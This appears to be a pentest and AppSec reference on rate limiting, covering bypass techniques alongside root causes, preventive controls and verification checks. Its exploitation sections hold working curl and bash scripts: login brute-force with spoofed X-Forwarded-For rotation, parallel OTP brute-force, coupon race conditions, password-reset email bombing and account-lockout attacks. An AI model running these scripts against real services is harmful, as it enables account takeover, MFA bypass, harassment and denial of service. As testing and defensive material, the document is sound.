# Rate Limiting

> Rate limiting caps how many requests a client can make in a given time window. It protects against brute-force, credential stuffing, scraping, resource exhaustion, and business-logic abuse (coupon reuse, inventory hoarding, spam). It is not a security control by itself, but it is a critical layer in front of authentication, password reset, OTP verification, and any costly operation.
>
> Rate limiting fails in two directions. It can be absent (no limit at all), or it can be present but bypassable. Bypass techniques are numerous: spoofing `X-Forwarded-For`, `X-Real-IP`, or `X-Client-IP` headers; using IPv6 address rotation; rotating user agents; hitting different endpoints that share a backend counter; triggering limits on the account owner to lock them out; and exploiting race conditions in the counter update itself.
>
> This file covers rate limiting from both sides: the pentest track (detection, bypass, abuse) and the AppSec track (root causes, correct implementation, verification).
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [What Rate Limiting Is](#1-what-rate-limiting-is)
2. [Detection](#2-detection)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Common Variants](#5-common-variants)
6. [Exploitation Recipes](#6-exploitation-recipes)
7. [Post-Exploitation](#7-post-exploitation)
8. [Risk Context (AppSec)](#8-risk-context-appsec)
9. [Root Causes (AppSec)](#9-root-causes-appsec)
10. [Preventive Controls (AppSec)](#10-preventive-controls-appsec)
11. [Detection Controls (AppSec)](#11-detection-controls-appsec)
12. [Verification (AppSec)](#12-verification-appsec)
13. [OSCP Notes](#13-oscp-notes)
14. [Production Notes](#14-production-notes)
15. [References](#15-references)

---

## 1. What Rate Limiting Is

Rate limiting restricts the number of requests a client can issue in a defined period. It is enforced at one or more layers, and the layer that enforces it determines the bypass techniques.

### 1.1 Layers

```text
Client          Browser, mobile app (advisory only, never trusted)
Edge            CDN (Cloudflare, Akamai, Fastly) - global rules
Load balancer   nginx, HAProxy, Envoy - per-IP or per-connection
WAF             ModSecurity, cloud WAF - rules with rate conditions
Application     Per-user, per-session, per-endpoint, per-action
Database        Connection pool limits, query timeouts
```

Each layer sees a different identity. The edge sees the TCP source IP. The load balancer sees the connection. The application sees the session cookie, JWT, or API key. An attacker who changes layer-visible identity bypasses the corresponding limit.

### 1.2 Algorithms

Common rate-limiting algorithms:

- **Fixed window.** Counter per (key, window). Simple, but the boundary allows a 2x burst (100 at the end of window 1 + 100 at the start of window 2).
- **Sliding window log.** Timestamps of every request, pruned to the window. Accurate, memory-heavy.
- **Sliding window counter.** Weighted average of current and previous window. Good tradeoff.
- **Token bucket.** Bucket of N tokens, refilled at R tokens/second. Allows bursts up to N.
- **Leaky bucket.** Queue of fixed size, drained at a constant rate. Smooths bursts.

The choice matters: a fixed window with a 1-minute limit of 5 allows 10 requests in 2 seconds at the boundary. Sliding window or token bucket avoid this.

### 1.3 What rate limiting is not

Rate limiting is not a replacement for:

- **Account lockout** (brute-force protection after N failures per account, not per IP).
- **CAPTCHA / proof of work** (for scripted abuse from rotating IPs).
- **Anomaly detection** (for low-and-slow attacks spread over hours).
- **Input validation** (a well-formed malicious request is not stopped by rate limiting).
- **Authentication** (rate limiting slows credential stuffing, it does not stop it if the attacker is patient).

---

## 2. Detection

Rate limiting is detected by:

- Sending the same request repeatedly and observing a `429 Too Many Requests` response.
- `Retry-After`, `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `X-RateLimit-Reset` headers.
- Response time degradation after N requests.
- Error messages mentioning "too many requests", "slow down", "rate limit exceeded".

### Quick detection

```bash
# Send 20 requests quickly, look for 429
for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/api/login")
  echo "$i: $code"
done

# Check for rate-limit headers
curl -sI "http://$TARGET/api/login" | grep -iE "x-ratelimit|retry-after"
```

Expected output (rate limiting present):

```text
1: 200
2: 200
3: 200
4: 200
5: 429
6: 429
7: 429
```

Expected output (no rate limiting):

```text
1: 200
2: 200
3: 200
...
20: 200
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `429 Too Many Requests` after N requests | Rate limiting exists | Test bypass techniques |
| `Retry-After: N` | Time-based limit | Try other IPs, headers, accounts |
| `X-RateLimit-Remaining` decreases | Per-something counter | Determine the key (IP, session, user) |
| No 429 after 1000 requests | Likely no limit | Test for abuse (brute-force, scraping) |
| Only login limited | Sensitive endpoint limited | Other endpoints may be open |
| No limit on password reset | Password reset abuse | Email bombing, token enumeration |
| No limit on OTP | OTP brute-force | 4-6 digit OTP, brute-forceable |
| Limit per IP, not per account | IP rotation bypass | Use X-Forwarded-For or IPv6 |

---

## 3. Enumeration

### 3.1 Identify the limiting key

Send requests from different identities and observe when the limit triggers:

```bash
# Same IP, different sessions
curl -s -H "Cookie: session=A" "http://$TARGET/api/data" -o /dev/null -w "A: %{http_code}\n"
curl -s -H "Cookie: session=B" "http://$TARGET/api/data" -o /dev/null -w "B: %{http_code}\n"

# Same session, different IPs (via X-Forwarded-For)
curl -s -H "X-Forwarded-For: 1.1.1.1" "http://$TARGET/api/data" -o /dev/null -w "IP1: %{http_code}\n"
curl -s -H "X-Forwarded-For: 2.2.2.2" "http://$TARGET/api/data" -o /dev/null -w "IP2: %{http_code}\n"
```

If the limit trips on the same session but not on the different-IP requests, the key is the session. If the reverse, the key is the IP.

### 3.2 Identify the window

Tripping the limit and waiting reveals the window:

```bash
# Hit the limit
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" "http://$TARGET/api/login"
done | sort | uniq -c
# Wait and retry
sleep 30
curl -s -o /dev/null -w "after 30s: %{http_code}\n" "http://$TARGET/api/login"
sleep 30
curl -s -o /dev/null -w "after 60s: %{http_code}\n" "http://$TARGET/api/login"
```

The `Retry-After` header, if present, gives the window directly.

### 3.3 Enumerate endpoints with and without limits

Not every endpoint is limited. Test each one independently:

```bash
endpoints=(
  "/api/login"
  "/api/register"
  "/api/password-reset"
  "/api/otp/verify"
  "/api/contact"
  "/api/coupon/redeem"
  "/api/search"
  "/api/export"
)
for ep in "${endpoints[@]}"; do
  hits=0
  for i in $(seq 1 50); do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$ep")
    if [ "$code" = "429" ]; then hits=$((hits+1)); fi
  done
  echo "$ep -> 429 hits in 50: $hits"
done
```

Endpoints with sensitive impact (OTP, password reset, coupon) that are NOT limited are the highest-value findings.

### 3.4 Test headers that shift the key

Many apps compute the rate-limit key from a header that an attacker controls:

```bash
# Common spoofable headers
headers=(
  "X-Forwarded-For: 1.2.3.4"
  "X-Real-IP: 1.2.3.4"
  "X-Client-IP: 1.2.3.4"
  "X-Originating-IP: 1.2.3.4"
  "X-Remote-IP: 1.2.3.4"
  "X-Remote-Addr: 1.2.3.4"
  "Forwarded: for=1.2.3.4"
  "True-Client-IP: 1.2.3.4"
  "CF-Connecting-IP: 1.2.3.4"
)
for h in "${headers[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "$h" "http://$TARGET/api/login")
  echo "$h -> $code"
done
```

A single `200` after a `429` burst means the header bypasses the limit.

---

## 4. Attack Surface Map

| Layer | Vector | What to test |
|-------|--------|--------------|
| Client IP | `X-Forwarded-For` spoof | Rotate header values |
| Client IP | IPv6 rotation | /64 gives 2^64 addresses |
| Client IP | Mobile carrier NAT | Shared IPs trigger limits on unrelated users |
| Session | Session not bound to IP | Rotate sessions after login |
| Account | Per-account limit | Lock out other users (DoS) |
| Account | No per-account limit | Brute-force one user from many IPs |
| Endpoint | Shared backend counter | Hit one endpoint to bypass the other |
| Endpoint | Different paths, same handler | `/api/login` vs `/api/v1/login` |
| Path | Trailing slash | `/api/login/` vs `/api/login` |
| Path | Case sensitivity | `/api/Login` vs `/api/login` |
| Path | URL encoding | `/%61pi/login` |
| HTTP | Method | POST vs PUT vs PATCH |
| HTTP | Header case | `X-Forwarded-For` vs `x-forwarded-for` |
| HTTP | Chunked encoding | `Transfer-Encoding: chunked` splits the body |
| Race | Parallel requests | 100 concurrent requests hit before counter updates |
| OTP | OTP brute-force | 4-6 digit codes, no limit = full brute |
| Password reset | Token enumeration | No limit + short token = account takeover |

---

## 5. Common Variants

### 5.1 Missing rate limiting on authentication endpoints

No limit on `/login`, `/password-reset`, or `/otp/verify`. Brute-force, credential stuffing, and OTP bypass become practical.

```bash
# 1000 login attempts, no 429
for pw in $(cat /usr/share/wordlists/rockyou.txt | head -1000); do
  curl -s -o /dev/null -X POST "http://$TARGET/api/login" -d "user=admin&pass=$pw"
done
```

**CWE-307:** Improper Restriction of Excessive Authentication Attempts. **OWASP 2021:** A07 Identification and Authentication Failures.

### 5.2 Per-IP limit only (no per-account)

The limit is enforced per source IP, but not per target account. An attacker with many IPs (botnet, cloud, IPv6) can attack a single account indefinitely; conversely, an attacker on a shared IP can lock out legitimate users by exhausting the IP limit.

```bash
# From many IPs via header spoofing
for i in $(seq 1 100); do
  curl -s -X POST "http://$TARGET/api/login" -H "X-Forwarded-For: 10.0.0.$i" -d "user=admin&pass=guess$i"
done
```

**CWE-307.** **OWASP API 2023:** API2 Broken Authentication.

### 5.3 `X-Forwarded-For` trust (IP spoofing)

The application reads the client IP from `X-Forwarded-For` without validating that it came from a trusted proxy. An attacker sets the header to any value and gets a fresh rate-limit bucket per request.

```bash
# Each request with a new fake IP bypasses the limit
for i in $(seq 1 1000); do
  curl -s -o /dev/null -X POST "http://$TARGET/api/login" \
    -H "X-Forwarded-For: 10.0.$((i/256)).$((i%256))" \
    -d "user=admin&pass=guess$i"
done
```

**CWE-348:** Use of Less Trusted Source. **OWASP 2021:** A05 Security Misconfiguration.

### 5.4 IPv6 rotation

A single IPv6 /64 subnet contains 2^64 addresses. An attacker with an IPv6 prefix can rotate source addresses per request, and the server sees each request from a fresh IP.

**CWE-307.** **OWASP 2021:** A07.

### 5.5 Race conditions in the counter

Read-modify-write on a counter without atomicity. 100 parallel requests can all read "counter = 4" (limit 5), all pass, and all increment, giving 104 requests instead of 5.

```bash
# Parallel burst
seq 1 100 | xargs -P 100 -I{} curl -s -o /dev/null -X POST "http://$TARGET/api/otp/verify" -d "otp={}"
```

**CWE-362:** Concurrent Execution Using Shared Resource. **OWASP 2021:** A04 Insecure Design.

### 5.6 Fixed window boundary burst

Fixed-window limits allow 2x burst at the boundary: 100 requests at 00:59:59 and 100 at 01:00:00 = 200 in 2 seconds, if the limit is 100/minute.

```bash
# Send 100 requests at the end of the window
# Wait until the window boundary
# Send 100 more immediately
```

**CWE-770:** Allocation of Resources Without Limits. **OWASP 2021:** A04.

### 5.7 Path / case / encoding bypass

Different URLs that hit the same handler may have independent rate-limit counters:

```bash
# Same handler, different URLs
curl -s -X POST "http://$TARGET/api/login" -d "user=admin&pass=x"
curl -s -X POST "http://$TARGET/api/login/" -d "user=admin&pass=x"
curl -s -X POST "http://$TARGET/api/Login" -d "user=admin&pass=x"
curl -s -X POST "http://$TARGET/api/%6Cogin" -d "user=admin&pass=x"
curl -s -X POST "http://$TARGET/api/login?x=1" -d "user=admin&pass=x"
```

**CWE-436:** Interpretation Conflict. **OWASP 2021:** A05.

### 5.8 Lockout as denial of service

Per-account lockout after N failures is a security control, but it can be weaponized. An attacker who knows a target username can lock them out by sending N bad passwords. Legitimate users are denied access.

This is a design tradeoff. The correct balance is progressive delays, CAPTCHA after a threshold, and alerting - not a hard lock that anyone can trigger.

**CWE-645:** Overly Restrictive Account Lockout Mechanism. **OWASP 2021:** A04.

### 5.9 No limit on password reset

The password reset endpoint sends an email per request. No limit means an attacker can email-bomb a victim, or enumerate valid emails by observing different responses. If the reset token is short (6 digits), brute-force is also possible.

**CWE-307 / CWE-640:** Weak Password Recovery Mechanism. **OWASP 2021:** A07.

### 5.10 No limit on OTP

OTP endpoints frequently have no rate limit. A 6-digit OTP has 1,000,000 combinations. At 1000 requests/second, brute-force takes 17 minutes. Without rate limiting, OTP is not a security control.

**CWE-307.** **OWASP 2021:** A07.

### 5.11 Credential stuffing with low-and-slow

Distributed attacks from many IPs, each below the per-IP threshold, over hours. This is not defeated by any rate limiter that works per IP. It requires per-account failure counts, breach-password checks (HIBP integration), and behavioral anomaly detection.

**CWE-307.** **OWASP 2021:** A07.

### 5.12 Rate limit on the wrong layer

A CDN rate limit that applies only to cached paths does nothing for `/api/*` (uncacheable). A load balancer limit that applies per connection does nothing against a client that opens new connections.

**CWE-770.** **OWASP 2021:** A04, A05.

---

## 6. Exploitation Recipes

### 6.1 Login brute-force with X-Forwarded-For rotation

1. Confirm no rate limit, or a limit that keys on a spoofable header.

```bash
# Confirm baseline
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST "http://$TARGET/api/login" -d "user=admin&pass=x"
done | sort | uniq -c
```

2. Add `X-Forwarded-For` rotation:

```bash
for i in $(seq 1 10000); do
  pw=$(sed -n "${i}p" /usr/share/wordlists/rockyou.txt)
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "http://$TARGET/api/login" \
    -H "X-Forwarded-For: 10.0.$((i/256)).$((i%256))" \
    -d "user=admin&pass=$pw")
  if [ "$code" = "302" ]; then echo "[+] found: $pw"; break; fi
done
```

3. On success, log the credential.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.2 OTP brute-force with parallel requests

1. Trigger an OTP for a target account.
2. Send all 1,000,000 codes in parallel (bounded by concurrency).

```bash
seq -w 0 999999 | xargs -P 50 -I{} curl -s -o /dev/null -X POST "http://$TARGET/api/otp/verify" \
  -H "X-Forwarded-For: 10.0.0.$((RANDOM%256))" \
  -d "otp={}"
```

3. If no rate limit and no account lockout, one of the requests succeeds.

### 6.3 Race condition on coupon redemption

1. A coupon can be redeemed once per user. Send 100 parallel redemption requests.

```bash
seq 1 100 | xargs -P 100 -I{} curl -s -X POST "http://$TARGET/api/coupon/redeem" \
  -H "Cookie: session=<VICTIM_SESSION>" \
  -d "code=WELCOME10"
```

2. If the counter update is not atomic, the coupon is redeemed multiple times.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.4 Password reset email bombing

1. Trigger password reset for the victim many times.

```bash
for i in $(seq 1 100); do
  curl -s -o /dev/null -X POST "http://$TARGET/api/password-reset" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "email=victim@example.com"
done
```

2. If no limit, the victim receives 100 emails.

### 6.5 Account lockout DoS

1. Identify a target username.
2. Send N bad passwords to trigger the lockout.

```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -X POST "http://$TARGET/api/login" -d "user=victim&pass=wrong$i"
done
# Victim is now locked out
```

3. If the lockout duration is long (30 minutes or more), the DoS is effective.

---

## 7. Post-Exploitation

Once rate limiting is bypassed:

- **Credential stuffing at scale.** With a leaked password list, test thousands of accounts per hour.
- **OTP and MFA bypass.** If the second factor is a short numeric code without rate limiting, MFA is effectively broken.
- **Enumeration.** Username, email, coupon, and token enumeration become practical.
- **Resource abuse.** Scraping, cost amplification (per-request billing), compute exhaustion.
- **Business logic abuse.** Coupon reuse, inventory hoarding, spam, rating manipulation.
- **Lockout DoS.** Deny access to specific users by triggering lockouts.

For the report: which endpoint, what limit (or lack of it), what the exploit was, and what the impact was.

---

## 8. Risk Context (AppSec)

Rate-limiting failures map to:

| Standard | Rate-limiting manifestation |
|----------|------------------------------|
| OWASP 2021 A04 Insecure Design | Missing rate limit as a design choice |
| OWASP 2021 A05 Security Misconfiguration | Wrong layer, spoofable header key |
| OWASP 2021 A07 Auth Failures | No limit on login, OTP, password reset |
| OWASP 2021 A09 Logging Failures | No alert on abnormal request rate |
| OWASP API 2023 API2 Broken Authentication | No limit on authentication |
| OWASP API 2023 API4 Unrestricted Resource Consumption | No limit on expensive operations |
| OWASP API 2023 API6 Unrestricted Access to Sensitive Business Flows | Coupon, inventory, spam |

---

## 9. Root Causes (AppSec)

Recurring root causes for rate-limiting failures:

1. **No rate limit at all.** The endpoint is exposed without any limit. Common in MVPs and internal tools that later become public.
2. **Rate limit at the wrong layer.** The CDN or load balancer sees only cached paths or per-connection identity, not the API traffic.
3. **Client-controlled key.** The rate-limit key is taken from `X-Forwarded-For`, `X-Real-IP`, or similar headers without validating the immediate proxy.
4. **Per-IP only, no per-account.** Distributed attacks and shared-NAT false positives.
5. **Non-atomic counters.** Race conditions allow bursts far above the limit.
6. **Fixed window with boundary burst.** 2x the nominal rate is achievable at the window boundary.
7. **No limit on sensitive flows.** OTP, password reset, coupon redemption, and invitation emails are the high-value endpoints; they are often overlooked.
8. **Lockout as the only mechanism.** Account lockout weaponized for DoS.
9. **No monitoring.** Rate limits trip silently; no alert.

---

## 10. Preventive Controls (AppSec)

**Design:**

- **Identify sensitive flows:** authentication, password reset, OTP, registration, coupon redemption, email send, expensive compute, and any per-user quota. Every one gets a limit.
- **Design limits at multiple layers:** edge (per-IP), application (per-session, per-account, per-endpoint, per-action), database (connection pool).
- **Combine algorithms:** token bucket for bursty traffic, sliding window for sensitive operations.

**Implementation:**

- **Trust chain for client IP.** Only trust `X-Forwarded-For` from known proxies. At each hop, append the immediate client IP, do not overwrite. Read the leftmost untrusted value.
- **Rate-limit key is the authenticated identity** (user ID, API key), not the client IP. Use IP only as a secondary signal.
- **Atomic counters.** Use Redis `INCR` with `EXPIRE`, or an atomic database operation. Never read-modify-write.
- **Distributed counters.** If the app runs on multiple nodes, the counter must be shared (Redis, memcached, or a database). In-memory counters are per-node and effectively multiply the limit by the number of nodes.
- **Return consistent errors.** `429 Too Many Requests` with `Retry-After`. Do not leak whether the user exists.
- **Account-level protections beyond rate limiting:** progressive delays, CAPTCHA, breach-password checks (HIBP), MFA.

**OTP and password reset:**

- **Hard limit on attempts per token** (e.g. 5 wrong OTPs invalidates the token).
- **Short token lifetime** (5-10 minutes).
- **Bind token to session, user, and IP where possible.**
- **Rate limit per recipient email address**, not only per IP. This prevents email bombing from distributed sources.

**Monitoring:**

- **Alert on 429 rate.** A spike means either a broken client or an attack in progress.
- **Alert on login failure rate** per account and per IP.
- **Track distinct-IP logins per account** - credential stuffing signal.

---

## 11. Detection Controls (AppSec)

Signals worth monitoring:

- **429 rate spikes.** Sudden increase in rate-limited responses.
- **Login failure rate per account** over time.
- **Login failure rate per IP**, and distinct IPs per account.
- **Distinct accounts per IP** in a short window - stuffing signal.
- **Unusual request patterns** (no User-Agent variation, fixed timing, sequential paths).
- **`X-Forwarded-For` spoofing** - log both the direct peer IP and the header value; alert when they diverge in unexpected ways.
- **Parallel bursts** on sensitive endpoints - race-condition signal.
- **Password reset requests per recipient** - email bombing signal.
- **OTP verify failures per token.**

---

## 12. Verification (AppSec)

Concrete checks:

| Control | Verification |
|---------|--------------|
| Login rate limit | Send N+1 login attempts; expect `429` on N+1 |
| Per-account limit | Send N+1 attempts against one account; expect rejection, regardless of source IP |
| OTP rate limit | Send N+1 wrong OTPs; expect rejection, and token invalidation after N |
| Password reset limit | Send N+1 reset requests; expect rejection per recipient |
| `X-Forwarded-For` spoof | Send `X-Forwarded-For: 1.2.3.4` from an untrusted source; expect the value to be ignored |
| Distributed counter | Send N+1 requests through two app nodes; expect the combined total to be limited |
| Atomic counter | Fire 100 parallel requests at a 5-request limit; expect at most 5 successes |
| Window algorithm | Observe if boundary bursts of 2x are possible |
| 429 consistency | Errors must be `429` with `Retry-After`; not generic 500 or 403 |
| No user enumeration | Rate limit errors must not reveal whether the user exists |

Cross-reference: OWASP ASVS 4.0 V2 (Authentication), V4 (Access Control), V11 (Business Logic), V13 (API and Web Service). OWASP API Security Top 10:2023 API4 (Unrestricted Resource Consumption), API6 (Unrestricted Access to Sensitive Business Flows). See `../../01 Web/08 Vulnerabilities/` for related logic-abuse walkthroughs.

---

## 13. OSCP Notes

Rate limiting is a supporting finding on OSCP, not usually the main one, but it enables higher-impact attacks:

- **Always test the login endpoint** for a rate limit. A successful brute-force is often the winning move.
- **Test the password reset endpoint** for a rate limit and a short token. Password reset abuse leads to account takeover.
- **Test OTP endpoints** if MFA is present. No rate limit = MFA bypass.
- **Use `X-Forwarded-For` rotation** to bypass a per-IP limit:
  `curl -H "X-Forwarded-For: 10.0.0.$RANDOM" ...`
- **Try path variations** (`/api/login`, `/api/login/`, `/api/Login`) - some apps have separate counters.
- **Use `ffuf` or `hydra` with the `-H` option** to add a per-request header.
- **For OSCP reporting, rate-limiting bypass is a finding on its own only if it enables a credential or data compromise.** Otherwise it is a supporting note.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## 14. Production Notes

| Practice | Verdict |
|----------|---------|
| Rate limit on login | Required |
| Rate limit on password reset | Required |
| Rate limit on OTP verify | Required |
| Rate limit on registration | Required |
| Rate limit on any expensive compute | Required |
| Per-account + per-IP + per-endpoint limits | Required |
| Distributed counters (Redis, DB) | Required for multi-node |
| Atomic increment | Required |
| Trust chain for `X-Forwarded-For` | Required |
| Return `429` with `Retry-After` | Recommended |
| Alert on 429 spikes | Recommended |
| CAPTCHA / PoW after threshold | Recommended for public endpoints |
| Breach-password check (HIBP) | Recommended for registration |
| Lockout as the only mechanism | Never |
| Rate limit only at the CDN | Insufficient for APIs |
| Rate limit keyed on client-controlled header | Never |
| Non-atomic counters | Never |

---

## 15. References

- OWASP API Security Top 10:2023 API4 Unrestricted Resource Consumption - https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP API Security Top 10:2023 API6 Unrestricted Access to Sensitive Business Flows - https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP Top 10:2021 A04 Insecure Design - https://owasp.org/Top10/A04_2021-Insecure_Design/
- OWASP Top 10:2021 A07 Identification and Authentication Failures - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
- OWASP ASVS 4.0 - https://owasp.org/www-project-application-security-verification-standard/
- OWASP Credential Stuffing Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html
- OWASP Authorization Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
- RFC 6585 - 429 Too Many Requests - https://datatracker.ietf.org/doc/html/rfc6585
- CWE-307 Improper Restriction of Excessive Authentication Attempts - https://cwe.mitre.org/data/definitions/307.html
- CWE-348 Use of Less Trusted Source - https://cwe.mitre.org/data/definitions/348.html
- CWE-362 Concurrent Execution - https://cwe.mitre.org/data/definitions/362.html
- CWE-770 Allocation of Resources Without Limits - https://cwe.mitre.org/data/definitions/770.html
- CWE-436 Interpretation Conflict - https://cwe.mitre.org/data/definitions/436.html
- CWE-645 Overly Restrictive Account Lockout Mechanism - https://cwe.mitre.org/data/definitions/645.html
- CWE-640 Weak Password Recovery - https://cwe.mitre.org/data/definitions/640.html
